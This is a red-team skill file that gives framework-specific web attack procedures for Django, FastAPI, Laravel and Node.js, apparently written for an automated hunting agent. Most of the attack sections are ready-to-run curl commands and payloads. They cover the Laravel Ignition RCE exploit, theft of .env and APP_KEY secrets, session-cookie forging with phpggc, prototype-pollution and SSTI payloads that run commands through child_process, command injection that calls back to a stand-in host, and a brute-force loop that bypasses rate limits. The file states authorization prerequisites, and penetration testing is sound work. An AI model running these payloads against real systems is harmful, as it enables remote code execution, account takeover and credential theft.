---
name: hunt-frameworks
description: Framework-specific web bug hunting for Django/DRF, FastAPI, Laravel, and Node.js — permission gaps, mass assignment, SSTI, debug surfaces, and prototype pollution. Use when the stack is fingerprinted as one of these frameworks.
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
  tags: [frameworks, django, fastapi, laravel, nodejs, redteam]
  category: redteam
  related_skills:
    - hunt-prototype-pollution
    - hunt-mass-assignment
    - hunt-api-misconfig
    - hunt-idor
    - hunt-rce
    - hunt-ssti
    - hunt-source-leak
---

# Framework-Specific Hunting (Django, FastAPI, Laravel, Node.js)

Parameterized consolidation of the former `hunt-django`, `hunt-fastapi`,
`hunt-laravel`, and `hunt-nodejs` skills. Pick the section matching the
fingerprinted framework; the techniques inside each section are unchanged.

## When to Use

- The target is fingerprinted as Django/DRF (`csrftoken`, `/admin/`, DRF browsable API), FastAPI (`/docs`, 422 `detail` arrays), Laravel (`XSRF-TOKEN`/`laravel_session` cookies, Ignition pages), or Node.js/Express (`X-Powered-By`, EJS/Pug artifacts).
- You need framework-specific sinks rather than generic API testing.

## Prerequisites

- Explicit authorization, target boundaries, and rate limits for the target.
- Tooling: `curl`, `jq`, `python3`; framework extras as noted per section (`phpggc` for Laravel, Node runtime for gadget checks).
- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
- For any state-changing step (registration, PATCH loops, uploads, command-execution probes), obtain explicit confirmation immediately before the command.

## How to Run

Fingerprint first, then jump to the matching section:

```bash
TARGET="https://target.example"
curl --max-time 10 -sI "$TARGET" | grep -iE "x-powered-by|set-cookie|server"
curl --max-time 10 -sk "$TARGET/docs" -o /dev/null -w "fastapi docs: %{http_code}\n"
curl --max-time 10 -sk "$TARGET/admin/login/" -o /dev/null -w "django admin: %{http_code}\n"
curl --max-time 10 -sk "$TARGET/ignition/health-check" -o /dev/null -w "laravel ignition: %{http_code}\n"
```

## Procedure

Read the framework selection table, then follow the phases of the matching
section. Every section keeps its own pitfalls and verification notes.

| Framework | Hunt first | Hunt second |
|---|---|---|
| Django/DRF | IDOR via ModelViewSet without object perms | SSTI via `mark_safe` |
| FastAPI | OpenAPI-mined hidden routes, dependency-injection auth gaps | Pydantic extra-field mass assignment |
| Laravel | Ignition debug RCE preconditions, `.env`/`APP_KEY` | Eloquent mass assignment |
| Node.js | Prototype pollution to RCE | `trust proxy` IP spoofing, SSTI in EJS/Pug |

---

## Django

Hunt Django-specific vulnerabilities focusing on Django REST Framework (DRF) permission class gaps, ORM raw query injection, template injection via `|safe` and `mark_safe`, and Django admin panel exploitation. Django's batteries-included approach creates unique attack surface: admin interface, ORM query building, DRF serializers, Channels WebSockets, and Celery task queues.

### Quick Detection

```bash
### Django fingerprinting
curl --max-time 30 --connect-timeout 10 -skI "https://target.com/admin/login/" | grep -iE "csrftoken|sessionid|django"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com" | grep -Eo 'csrftoken|__debug__|django'
```

### Pitfalls

- **DRF `AllowAny` ≠ misconfiguration.** Verify the endpoint is supposed to be public before reporting.
- **Django admin brute force is heavily logged.** Use with caution on production targets.
- **Template injection requires a sink.** Django's template engine auto-escapes by default — `|safe` or `mark_safe` must be explicitly used.
- **SECRET_KEY must be actually leaked.** Guessing or brute-forcing SECRET_KEY is computationally infeasible.

### Verification

1. DRF endpoint without `IsAuthenticated` returns data that should be restricted.
2. ORM raw query injection produces a database error or data exfiltration.
3. Django admin session cookie decoded successfully reveals user ID and session data.
4. Template injection executes JavaScript or reads server files.

### Related Skills

- **`hunt-sqli`** — Django ORM raw query injection chains to full SQL injection.
- **`hunt-ssti`** — Django template injection via user-controlled template names.
- **`hunt-idor`** — DRF permission gaps leading to object-level access.

---

## FastAPI

Hunt FastAPI-specific vulnerabilities in dependency injection authorization gaps, Pydantic model coercion and extra field exploitation, OpenAPI schema mining for hidden endpoints, and ASGI middleware bypasses. FastAPI's design — dependency injection for auth, Pydantic for validation, OpenAPI auto-generation — creates unique attack surface distinct from Flask or Django.

### Quick Detection

```bash
### FastAPI fingerprinting
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/openapi.json" | jq '.info.title' 2>/dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/docs" -w "%{http_code}\n" -o /dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/redoc" -w "%{http_code}\n" -o /dev/null
```

### Pitfalls

- **Pydantic v2 `model_config` with `extra='ignore'` silently drops unknown fields.** Test both Pydantic v1 and v2 behavior.
- **OpenAPI schema may be restricted.** If `/openapi.json` returns 403, try `/docs` and `/redoc` which serve the same data.
- **FastAPI Depends with `Security` is NOT the same as `Depends`.** `Security` integrates with OpenAPI security schemes — but both can be misconfigured.
- **Uvicorn `--proxy-headers` must be enabled for IP spoofing to work.** Check with `X-Forwarded-For` — if the server sees your real IP, proxy headers are disabled.

### Verification

1. OpenAPI schema reveals endpoints not documented in the public API docs.
2. An endpoint with `Depends(get_current_user)` accepts requests without any Authorization header.
3. Pydantic type coercion accepts string values for boolean/integer fields and persists them.
4. WebSocket endpoint accepts connections without session authentication while the REST equivalent requires it.

### Related Skills

- **`hunt-api-misconfig`** — Broader API configuration issues including Swagger/OpenAPI exposure.
- **`hunt-idor`** — Object-level authorization gaps in FastAPI path parameters.
- **`source-leak-hunt`** — Directory and endpoint discovery through OpenAPI schema mining.

---

## Laravel

### Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO

---

### Phase 1 — Fingerprint Laravel

```bash
### Laravel-specific indicators
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

### Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

### Check error page (trigger 404)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

### Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
### Step 1: Check if debug mode is enabled (Whoops error page)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

### If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

### Step 2: Check Ignition endpoint
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_ignition/health-check" | head -5

### Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
### (Requires debug mode + writable storage/logs)
### Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

### Manual test — send solution request
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

### Phase 3 — Laravel Telescope & Horizon

```bash
### Telescope — request/response logs, DB queries, jobs, cache, events
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

### Horizon — queue worker dashboard
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
### Failed job payloads often contain full request data including auth tokens

### Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

### Phase 4 — .env File & APP_KEY Exposure

```bash
### Direct .env access
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.production"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.backup"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.local"

### If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
### → Can decrypt all Laravel encrypted cookies
### → Can forge session cookies → ATO for any user

### Also check
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

### Phase 5 — Signed URL Manipulation

```bash
### Laravel signed URLs contain signature param: ?signature=HASH
### Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

### Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

### Modify user ID → should fail if properly signed
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/user=123/user=999}"

### Test signature bypass: remove signature entirely
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/&signature=VALID_SIG/}"

### Test: does the app validate ALL parameters or just some?
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL}&extra=malicious"
```

---

### Phase 6 — Mass Assignment via Eloquent

```bash
### Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
### Test: add extra fields to update/create requests

### Profile update
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

### Registration
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@[DOMAIN_EXAMPLE]", "password": "test123", "verified": true, "admin": 1}'
```

---

### Phase 7 — Laravel Cookie Deserialization

```bash
### If APP_KEY is known, forge a session cookie with malicious serialized payload
### Uses phpggc gadget chains

### Get the app key
APP_KEY=$(curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

### Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

### Sign the cookie with the app key using laravel-cookie-forge script
### python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

### Chain Table

| Laravel finding | Chain to | Impact |
|----------------|----------|--------|
| Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
| Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
| Horizon accessible | Read failed job payloads | High - PII/token exfil |
| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
| Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
| Mass assignment | Set is_admin=true → privilege escalation | Critical |

---

### Verification
✅ Ignition RCE: `id` command output returned in response
✅ Telescope: API responses contain DB queries with credentials or user tokens
✅ APP_KEY: Forged session cookie accepted, returns another user's profile
✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges

**Severity:**
- Ignition RCE: Critical
- Telescope/Horizon with sensitive data: High
- .env with APP_KEY: Critical
- Mass assignment to admin: Critical

---

### Pitfalls
- **APP_KEY exposure without exploit** — knowing the APP_KEY enables cookie decryption and signing. Demonstrate forged session cookie or decrypted data.
- **Debug mode without sensitive output** — `APP_DEBUG=true` showing stack traces is Low. Need credentials or secrets in the debug output.
- **.env exposure without database credentials** — exposed `.env` with only `APP_NAME=...` is informational. Need DB creds, API keys, or secrets.
- **Telescope/Horizon without auth** — these tools expose queue/cache/request data. Demonstrate access to sensitive data through them.

---

## Node.js

### HUNT-NODEJS — Node.js Specific Vulnerabilities

### Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

### Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

### Phase 1 — Fingerprint

```bash
### Confirm Node.js/Express
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

### Check for package.json / node_modules exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package-lock.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/node_modules/.package-lock.json"

### Error-based version detection
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

### Phase 2 — Prototype Pollution Detection

```bash
### JSON body injection — test if __proto__ is accepted
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

### Constructor prototype
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

### URL query param injection (qs library)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

### Confirm pollution: does a subsequent request reflect the polluted key?
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

### Phase 3 — Prototype Pollution → RCE Chain

```bash
### If pollution is confirmed, attempt to reach dangerous sinks

### Sink 1: child_process via options.shell pollution
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

### Sink 2: lodash template pollution (CVE-2021-23337)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

### Sink 3: ejs template options pollution
### If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

### OOB confirmation — check Interactsh for callback
```

---

### Phase 4 — Express Trust Proxy Abuse

```bash
### If Express has trust proxy enabled, X-Forwarded-For is trusted
### Test: does spoofed IP bypass IP-based rate limiting or allowlist?

### Spoof IP to 127.0.0.1 (localhost bypass)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

### Spoof to internal IP range
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

### Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

### Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
### EJS SSTI — if user input reaches EJS template context
### Test basic: <%= 7*7 %> should return 49
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

### EJS RCE payload
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

### Pug SSTI
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

### Handlebars — prototype pollution via template
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

### Phase 6 — child_process Command Injection

```bash
### Look for endpoints that run shell commands with user input
### Signals: /api/convert, /api/exec, /api/ping, /api/scan

### Basic injection test
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

### OOB via DNS
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

### Phase 7 — /proc/self/environ Exfil

```bash
### If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/environ"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

### Also check:
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command-line
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

### Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

### Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

### Verification

Run this self-test to confirm nodejs hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-nodejs" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

### Pitfalls
- **Prototype pollution without gadget** — `__proto__` injection is a primitive. Need a gadget chain to RCE, auth bypass, or XSS.
- **eval with static input** — `eval("'use strict'; ...")` is not exploitable. Need dynamic, user-controllable input.
- **child_process without user input** — `exec("ls -la")` is not exploitable unless the command includes user input.
- **Server-Side JavaScript Injection (SSJI)** — different from prototype pollution. Distinguish the two attack classes.

---

### Related Skills

- **`hunt-api-misconfig`** — Prototype pollution is a root cause category shared between API misconfig and Node.js-specific sinks. Chain primitive: JSON merge accepting `__proto__` → `hunt-api-misconfig` mass-assignment pattern (extra controller parameters) → admin field pollutes user object.
- **`hunt-rce`** — Prototype pollution that reaches `child_process` or `vm.runInThisContext` = RCE. Chain primitive: `__proto__` polluted with `shell:true` or `NODE_OPTIONS: "--require /proc/self/fd/0"` → `child_process.spawn` uses attacker-controlled env → arbitrary command execution.
- **`hunt-ssti`** — EJS, Pug, and Handlebars SSTI are Node.js-specific RCE vectors. Chain primitive: template engine receives user input via `render()` with unsanitized options → `outputFunctionName` pollution (EJS CVE-2022-29078) → `process.mainModule.require('child_process').execSync('id')`.
- **`hunt-lfi`** — Node.js LFI often reaches `require()` path traversal or `res.sendFile()` sinks. Chain primitive: `?file=../../../etc/passwd` on Express static file server → read configs; `require(userPath)` → load attacker-controlled JS file as module → RCE.
- **`hunt-ssrf`** — Express `http-proxy-middleware` with wildcard target config is a Node.js SSRF vector. Chain primitive: proxy target set to user input → request forwarded to internal service → read cloud metadata or internal admin panel.
- **`hunt-brute-force`** — Express `trust proxy` misconfiguration defeats IP-based rate limiting. Chain primitive: `app.set('trust proxy', true)` + `X-Forwarded-For: 127.0.0.1` → attacker bypasses login rate limit by rotating spoofed IPs.
- **`security-arsenal`** — Reach for the Node.js prototype pollution gadget tree (`lodash.merge`, `Object.assign`, `qs.parse`, `express-formidable`, `cookie-parser` merge modes) and EJS/Pug/Handlebars SSTI payload packs.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE from prototype pollution. Pollution of `__proto__` is a primitive — only Critical when it reaches a sink that interprets the polluted property as a command/env/option. Prove the sink is reachable with an OOB callback before writing the report.

---

## Pitfalls

Each framework section keeps its own pitfalls list; the cross-framework traps are:

- **Fingerprint from a single signal.** `X-Powered-By` can be faked or stripped; confirm with two independent indicators (cookie names, error pages, framework-specific paths) before loading a framework section.
- **Debug-surface presence is not RCE.** Whoops/Ignition pages, `/docs`, and Django `DEBUG=True` are preconditions; each section's RCE steps name the extra requirement (writable log path, eval-enabled console, reachable route).
- **Version-stale CVE claims.** Confirm the exact framework version from at least two sources before citing a CVE in a report.

## Verification

- Framework identity is confirmed by at least two independent signals.
- Each framework section's own Verification checklist must pass before its findings are promoted.
- Authorization-protected actions (registration, PATCH loops, uploads, console eval) are confirmed with a synthetic object and cleaned up afterwards.

## Related Skills

- **`hunt-prototype-pollution`** — Canonical prototype-pollution payload reference; the Node.js section summarizes only the framework sinks.
- **`hunt-mass-assignment`** — Generic field-injection methodology that the Laravel/Django/FastAPI sections instantiate per ORM.
- **`hunt-nextjs`** / **`hunt-nestjs`** — Framework skills for the Next.js and NestJS layers above a bare Node.js stack.
